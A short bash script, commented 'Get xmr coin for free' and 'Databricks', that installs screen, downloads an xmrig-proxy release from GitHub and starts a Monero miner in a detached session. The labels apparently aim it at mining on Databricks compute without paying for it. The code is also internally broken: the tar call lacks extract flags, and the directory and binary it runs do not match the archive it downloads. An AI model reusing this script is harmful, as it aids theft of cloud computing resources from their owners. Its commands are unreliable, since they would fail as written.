#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen

wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.15.1/xmrig-proxy-6.15.1-focal-x64.tar.gz
tar xmrig-proxy-6.15.1-focal-x64.tar.gz
cd xmrig-6.16.4
screen -R xmr
./xmrig
